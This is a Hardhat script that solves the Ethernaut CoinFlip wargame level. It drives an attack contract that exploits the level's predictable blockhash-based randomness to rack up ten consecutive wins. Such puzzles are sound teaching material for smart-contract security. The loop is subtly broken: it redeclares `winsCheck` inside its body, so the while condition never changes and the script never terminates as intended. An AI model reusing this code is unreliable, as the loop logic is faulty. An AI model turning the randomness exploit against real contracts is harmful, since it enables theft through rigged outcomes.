import { Wallet } from "ethers";
import { ethers } from "hardhat";

const attackCoinFlip = async () => {
    // change contract addresses here.
    const coinFlipAddress = "0xe3958F5f3E7C470c3F0a9d680C9C0670D9688a66"; //type "await contract.address()" in ethernaut console
    const player = "0x3C4f1C7Ab126a94016CA8F4e770522810aa61954"; //place your player address here

    // Don't touch below 🚀
    // Vulnerability from it being predictable
    // additional read:
    // https://ethereum.org/en/developers/docs/blocks/
    // https://solidity-by-example.org/interface/
    // typing all commands in console below
    // DON't FORGET TO DEPLOY 'AttackCoinFlip.sol' first before running this script !!!

    const attack = await ethers.getContract("AttackCoinFlip");
    const contract = await ethers.getContract("CoinFlip", coinFlipAddress);
    console.log("Checking consecutive wins, it should be zero...");
    const winsCheck = (await contract.consecutiveWins()).toString();
    console.log(`Consecutive win is: ${winsCheck}`);
    console.log("Rigging game by predicting result with the attack contract...");
    // const tx1 = await attack.guess(coinFlipAddress);
    // TODO: check for lastHash via blockhash and block.number
    while (winsCheck != "10") {
        const checkWin = (await contract.consecutiveWins()).toString();
        console.log(`Current consecutiveWin is: ${checkWin}`);
        const tx = await attack.guess(coinFlipAddress);
        const txReceipt = await tx.wait(1);
        console.log("Transaction done, aiming for '10' wins...");
        const winsCheck = (await contract.consecutiveWins()).toString();
    }
    console.log("10 wins achieved, you may submit to ethernaut");
};

attackCoinFlip()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
